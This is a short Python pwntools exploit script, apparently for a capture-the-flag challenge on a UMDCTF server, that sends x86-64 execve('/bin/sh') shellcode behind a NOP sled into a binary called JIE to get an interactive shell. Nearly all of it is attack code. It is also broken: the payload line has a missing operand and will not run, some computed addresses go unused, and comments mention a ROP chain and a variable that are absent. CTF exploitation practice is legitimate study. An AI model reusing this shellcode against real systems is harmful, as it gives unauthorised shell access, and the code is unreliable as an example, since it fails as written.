#!/usr/bin/python3
# 0x00007ffe1daf1070 0x00007ffd4c086840
from pwn import *

def binary_connect(local, debug):
    if local:
        if debug:
            p = gdb.debug('./JIE', '''
                break *(jump + 12)
                continue
            ''')
        else:
            p = process('./JIE')

    else:
        # Create process from local 
        p = remote('chals6.umdctf.io',7001)

    return p

def main():
    local = True    
    debug = True

    p = binary_connect(local, debug)
    e = ELF('./JIE')
    r = ROP(e)

    # recv initial prompt
    print(p.recvuntil('go?\n'))

    # RSP after sub 0x40 in jump
    stack_addr = 0x7fffffffdf20
    pop_rdi_addr = r.find_gadget(['pop rdi', 'ret']).address
    # execute /bin/sh
    bin_sh = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

    # send initial rop chain with length 0x1ffe (the 0x1fff char will be overwritten by fgets anyway)
    # store 0x00 in the first qword at name so that it can be used as a nullptr for rsi, rdx
    #p.send(bin_sh + b'A' * (0x48 - len(bin_sh)) + p64(rsp_addr) + b'\n')

    p.send(bin_sh.rjust((0x48), b'\x90') +  + b'\n')
    print(p.recv())
    p.interactive()


if __name__ == "__main__":
    main()
